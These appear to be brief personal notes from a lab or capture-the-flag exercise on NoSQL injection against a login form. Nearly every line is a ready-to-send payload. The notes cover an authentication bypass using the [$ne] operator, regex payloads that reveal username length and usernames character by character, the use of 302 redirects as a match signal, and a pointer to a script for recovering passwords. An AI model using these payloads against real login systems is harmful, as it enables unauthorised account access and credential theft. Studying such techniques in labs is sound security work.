**auth bypass**  
username[$ne]=test&password[$ne]=test&login=login

**finding lengths**  
username[$regex]=.{6}&password[$ne]=test&login=login -- confirm length is 5

**finding username**  
username[$regex]=a.*&password[$ne]=test&login=login
also can just look for 302s across all chars, since there are multiple users

**passwords**  
feed it into script to find password
